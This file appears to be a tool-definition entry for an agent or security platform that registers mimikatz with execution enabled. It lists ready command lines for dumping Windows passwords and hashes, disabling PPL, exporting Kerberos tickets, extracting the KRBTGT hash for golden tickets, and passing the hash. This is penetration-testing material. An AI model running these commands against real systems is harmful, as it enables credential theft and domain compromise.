---
id: security-credential-mimikatz
namespace: security:credential:mimikatz
name: mimikatz
description: Post-exploitation credential extraction tool that recovers plaintext
  passwords, NTLM hashes, Kerberos tickets, and DPAPI keys from Windows memory and
  registry hives.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.credential.dump.lsass
  - security.credential.wdigest
  - security.credential.ntlm
  - security.credential.kerberostickets
  - security.credential.dpapi
  - security.credential.masterkeys
  - security.pth
  - security.ptt
platforms:
  - windows
risk_level: critical
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
dependencies: []
related_tools:
  - netexec
  - impacket
contract:
  inputs:
    - type: windows.process.dump
      description: LSASS process dump file
  outputs:
    - type: security.credential.dump
      description: Extracted plaintext passwords, hashes, and tickets
  side_effects:
    - process_spawn
    - filesystem_write
resource_profile:
  cpu: medium
  memory_mb: 256
  network: low
  disk_io: low
allowed-tools:
  - mimikatz
parameters:
  - name: command
    type: string
    required: true
    description: "Mimikatz command (e.g., sekurlsa::logonpasswords)"
execution:
  template: "mimikatz \"{command}\" exit"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
examples:
  - description: "One-liner dump all logon passwords"
    command: mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
  - description: "Load mimikatz in memory via PowerShell"
    command: Invoke-Mimikatz -DumpCreds
  - description: "Disable PPL (Protected Process Light) before dumping"
    command: mimikatz "!+" "privilege::debug" "sekurlsa::logonpasswords" exit
  - description: "Extract credentials from a LSASS dump file"
    command: mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
  - description: "Extract credentials from volume shadow copy"
    command: mimikatz "lsadump::sam /server:$(hostname)" exit
  - description: "Extract Kerberos tickets"
    command: mimikatz "privilege::debug" "sekurlsa::tickets /export" exit
  - description: "Extract domain SID and KRBTGT hash for golden ticket"
    command: mimikatz "privilege::debug" "lsadump::lsa /inject /id:502" exit
  - description: "Pass-the-hash to RDP session"
    command: mimikatz "privilege::debug" "sekurlsa::pth /user:admin /domain:evilcorp /ntlm:<HASH> /run:mstsc.exe /restrictedadmin"
  - description: "DPAPI master key extraction"
    command: mimikatz "privilege::debug" "sekurlsa::dpapi" exit
references:
  - label: "mimikatz GitHub"
    url: "https://github.com/gentilkiwi/mimikatz"
techniques:
  - credential-access
  - privilege-escalation
attack_types:
  - CredentialAccess
  - PrivilegeEscalation
---

# mimikatz — Windows Credential Extraction

mimikatz is the standard tool for extracting credentials from Windows systems. It operates by reading LSASS process memory, SAM/SECURITY registry hives, and DPAPI master keys.

## Common Commands

| Command | Purpose |
|---------|---------|
| `privilege::debug` | Enable SeDebugPrivilege (required) |
| `sekurlsa::logonpasswords` | Dump plaintext passwords and NTLM hashes |
| `sekurlsa::tickets /export` | Export Kerberos tickets |
| `lsadump::lsa /inject` | Dump LSA secrets (KRBTGT hash) |
| `lsadump::sam` | Dump SAM hashes |
| `sekurlsa::pth` | Pass-the-hash |
| `dpapi::masterkey` | Extract DPAPI master keys |

## Requirements

- **Administrator privileges** on the target
- **SeDebugPrivilege**: Usually held by Administrators
- **PPL bypass**: Some systems require PPL evasion (e.g., `mimikatz !+`)
